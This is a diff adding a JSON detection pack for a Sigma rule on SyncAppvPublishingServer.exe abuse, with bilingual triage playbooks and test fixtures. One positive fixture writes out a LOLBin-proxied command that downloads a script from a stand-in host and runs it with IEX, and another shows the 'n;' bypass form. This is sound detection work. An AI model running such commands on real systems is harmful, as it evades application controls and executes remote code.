@@ -1,0 +1,138 @@
+{
+  "rule": {
+    "id": "dddfebae-c46f-439c-af7a-fdb6bde90218",
+    "title": "SyncAppvPublishingServer Execution to Bypass Powershell Restriction",
+    "level": "medium",
+    "status": "test",
+    "author": "Ensar Şamil, @sblmsrsn, OSCD Community",
+    "path": "windows/powershell/powershell_script/posh_ps_syncappvpublishingserver_exe.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/powershell/powershell_script/posh_ps_syncappvpublishingserver_exe.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un script block de PowerShell hace referencia a SyncAppvPublishingServer.exe, un binario firmado de App-V que puede ejecutar comandos de PowerShell fuera de powershell.exe. Esto puede indicar un intento de evadir restricciones de ejecución de PowerShell.",
+      "what_it_detects": "Eventos 4104 (Script Block Logging) cuyo campo ScriptBlockText contiene la cadena 'SyncAppvPublishingServer.exe'. Requiere que Script Block Logging esté habilitado.",
+      "why_it_matters": "SyncAppvPublishingServer.exe es un LOLBin documentado en LOLBAS: un argumento como \"n; <comando>\" se ejecuta como código PowerShell. Los atacantes lo usan para eludir bloqueos de powershell.exe o controles de aplicaciones (ATT&CK T1218, System Binary Proxy Execution).",
+      "triage_steps": [
+        "Lea el ScriptBlockText completo y busque argumentos que empiecen con \"n;\" seguidos de comandos como IEX, DownloadString, Start-Process o contenido codificado.",
+        "Si el script está dividido en varios eventos, reconstrúyalo agrupando por ScriptBlockId y ordenando por MessageNumber.",
+        "Identifique el usuario y el host (Computer); confirme si el usuario utiliza App-V legítimamente o es una cuenta de servicio esperada.",
+        "Busque la creación de SyncAppvPublishingServer.exe (Sysmon 1 o 4688) en el mismo host y revise su CommandLine, ParentImage y procesos hijos.",
+        "Revise conexiones de red, consultas DNS y archivos creados en el mismo host dentro de +/- 15 minutos del evento.",
+        "Verifique si el cliente App-V está habilitado (Get-AppvStatus) y si el Path del script corresponde a una herramienta corporativa conocida.",
+        "Consulte alertas previas del mismo usuario y host, especialmente por bloqueos de PowerShell, AppLocker o descargas sospechosas."
+      ],
+      "false_positives": [
+        "Clientes App-V que sincronizan paquetes con el servidor de publicación mediante SyncAppvPublishingServer.exe.",
+        "Scripts de administración o despliegue (SCCM, Intune) que gestionan la sincronización de App-V.",
+        "Ejercicios de red team o pruebas autorizadas basadas en LOLBAS."
+      ],
+      "response_steps": [
+        "Confirme con el responsable del equipo o de App-V si la ejecución estaba prevista; documente la evidencia del script block.",
+        "Si el comando ejecuta código no autorizado, aísle el endpoint y conserve memoria, logs de PowerShell y artefactos descargados.",
+        "Bloquee los dominios, IP o hashes identificados y busque los mismos indicadores en el resto de la flota.",
+        "Si App-V no se usa, restrinja SyncAppvPublishingServer.exe con AppLocker o WDAC; restablezca credenciales si hubo exposición."
+      ],
+      "severity_rationale": "Media porque el binario tiene usos legítimos en entornos App-V, pero invocarlo desde PowerShell es una técnica de evasión conocida que requiere revisión."
+    },
+    "en": {
+      "summary": "A PowerShell script block references SyncAppvPublishingServer.exe, a signed App-V binary that can run PowerShell commands outside powershell.exe. This may be an attempt to bypass PowerShell execution restrictions.",
+      "what_it_detects": "Event 4104 (Script Block Logging) where ScriptBlockText contains the string 'SyncAppvPublishingServer.exe'. Script Block Logging must be enabled.",
+      "why_it_matters": "SyncAppvPublishingServer.exe is a documented LOLBAS binary: an argument such as \"n; <command>\" is executed as PowerShell code. Attackers use it to get around powershell.exe blocks or application control (ATT&CK T1218, System Binary Proxy Execution).",
+      "triage_steps": [
+        "Read the full ScriptBlockText and look for arguments starting with \"n;\" followed by IEX, DownloadString, Start-Process or encoded content.",
+        "If the script spans several events, rebuild it by grouping on ScriptBlockId and ordering by MessageNumber.",
+        "Identify the user and host (Computer); confirm whether the user legitimately uses App-V or is an expected service account.",
+        "Find the SyncAppvPublishingServer.exe process creation (Sysmon 1 or 4688) on the host and review its CommandLine, ParentImage and child processes.",
+        "Review network connections, DNS queries and file writes on the same host within +/- 15 minutes.",
+        "Check whether the App-V client is enabled (Get-AppvStatus) and whether the script Path matches a known corporate tool.",
+        "Look for earlier alerts for the same user and host, especially PowerShell, AppLocker blocks or suspicious downloads."
+      ],
+      "false_positives": [
+        "App-V clients syncing packages with the publishing server through SyncAppvPublishingServer.exe.",
+        "Administration or deployment scripts (SCCM, Intune) that manage App-V synchronization.",
+        "Authorized red team exercises or LOLBAS-based testing."
+      ],
+      "response_steps": [
+        "Confirm with the host owner or App-V team whether the execution was expected; preserve the script block evidence.",
+        "If unauthorized code ran, isolate the endpoint and collect memory, PowerShell logs and any downloaded artifacts.",
+        "Block identified domains, IPs or hashes and hunt for the same indicators across the fleet.",
+        "If App-V is unused, restrict SyncAppvPublishingServer.exe with AppLocker or WDAC; reset credentials if exposure occurred."
+      ],
+      "severity_rationale": "Medium because the binary has legitimate App-V uses, but invoking it from PowerShell is a known evasion technique that warrants review."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "PowerShell script uses SyncAppvPublishingServer.exe to proxy a download-and-execute command",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "WS-0142.andes.example.com",
+          "ScriptBlockText": "Start-Process -FilePath 'C:\\Windows\\System32\\SyncAppvPublishingServer.exe' -ArgumentList \"n; (New-Object Net.WebClient).DownloadString('http://update.example.com/a.ps1') | IEX\"",
+          "ScriptBlockId": "3f1c2a7e-8b44-4d1e-9a62-5c0e7d9b1a21",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": "C:\\Users\\jperez\\AppData\\Local\\Temp\\run.ps1",
+          "UserID": "S-1-5-21-1111111111-2222222222-3333333333-1142"
+        }
+      },
+      {
+        "description": "Direct invocation of the binary with a PowerShell command argument",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "WS-0207.andes.example.com",
+          "ScriptBlockText": "& SyncAppvPublishingServer.exe \"n; Start-Process calc.exe\"",
+          "ScriptBlockId": "a9d0e4b2-6c3f-4f8a-b1e7-2d5c9f0a7e33",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": "",
+          "UserID": "S-1-5-21-1111111111-2222222222-3333333333-1207"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate App-V management cmdlets with no reference to the executable",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "WS-0142.andes.example.com",
+          "ScriptBlockText": "Get-AppvStatus; Sync-AppvPublishingServer -ServerId 1 -Global",
+          "ScriptBlockId": "c47e1b90-2d6a-4e3b-8f15-9a0b3c6d2e48",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": "C:\\ProgramData\\IT\\appv-sync.ps1",
+          "UserID": "S-1-5-18"
+        }
+      },
+      {
+        "description": "Script references the VBS variant, not the .exe, so the contains match fails",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "WS-0311.andes.example.com",
+          "ScriptBlockText": "Test-Path 'C:\\Windows\\System32\\SyncAppvPublishingServer.vbs'",
+          "ScriptBlockId": "e5b2f7c1-9a3d-4b6e-a0c8-1f4d7e2b9c56",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": "C:\\ProgramData\\IT\\inventory.ps1",
+          "UserID": "S-1-5-18"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:13+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
